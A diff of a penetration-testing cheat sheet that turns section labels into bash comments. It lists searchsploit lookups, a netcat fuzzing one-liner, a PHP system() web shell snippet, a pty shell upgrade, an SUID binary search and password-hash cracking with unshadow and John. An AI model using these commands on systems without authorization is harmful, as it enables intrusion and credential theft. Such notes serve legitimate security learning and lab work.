@@ -27,34 +27,34 @@ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip
 
 EXPLOIT
 ```bash
-CVE / Exploit Search
+#CVE / Exploit Search
 searchsploit <name>
 searchsploit -p <id>
 cp <path> .
 
-Fuzzing 
+#Fuzzing 
 python -c 'print("A" * 5000)' | nc <ip> <port>
   
-php shell command
+#php shell command
 "<?php system('id'); ?>"
 
-upgrade shell
+#upgrade shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 PRIVESC
 ```bash
-SUID BINARY
+#SUID BINARY
 find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 
-Crack Password with John
+#Crack Password with John
 unshadow passwd.txt shadow.txt > unshadow.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
 ```
 
 ENCODING/DECODING
 ```bash
-bash urlencode
+#bash urlencode
 echo $( php -r "echo urlencode('Start: #1, Zeichen {13/24} Ende();');"; )
 #!/bin/bash
 echo $( php -r "echo urlencode(\"$1\");"; )
